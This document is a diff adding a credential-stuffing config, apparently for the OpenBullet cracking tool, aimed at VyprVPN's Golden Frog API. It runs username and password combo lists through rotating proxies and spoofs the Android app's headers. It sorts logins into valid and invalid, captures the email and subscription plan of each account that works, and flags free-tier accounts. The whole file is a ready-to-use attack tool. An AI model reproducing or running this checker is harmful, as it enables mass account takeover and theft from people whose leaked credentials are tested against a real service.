@@ -1,0 +1,50 @@
+[SETTINGS]
+{
+  "Name": "VyprVPN API Config",
+  "SuggestedBots": 100,
+  "LastModified": "2019-05-15T17:30:46.9796028+02:00",
+  "AdditionalInfo": "",
+  "Author": "Seliax",
+  "Version": "1.2.8 Anomaly",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST GET "https://api.goldenfrog.com/settings" 
+  
+  HEADER "User-Agent: okhttp/3.8.1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: api.goldenfrog.com" 
+  HEADER "username: <USER>" 
+  HEADER "password: <PASS>" 
+  HEADER "X-GF-Agent: VyprVPN Android v2.30.0.10229. (c3261b51)" 
+  HEADER "X-GF-PRODUCT: VyprVPN" 
+  HEADER "X-GF-PRODUCT-VERSION: 2.30.0.10229" 
+  HEADER "X-GF-PLATFORM: Android" 
+  HEADER "X-GF-PLATFORM-VERSION: 5.0.2" 
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "\"account_level" 
+  KEYCHAIN Failure OR 
+    KEY "invalid username or password" 
+#User PARSE "<SOURCE>" LR "\"user_email\": \"" "\"," -> CAP "User's Email" 
+#Capture_Level PARSE "<SOURCE>" LR "account_level\": \"" "\", " -> CAP "Plan" 
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"account_level\": \"Free\", " 
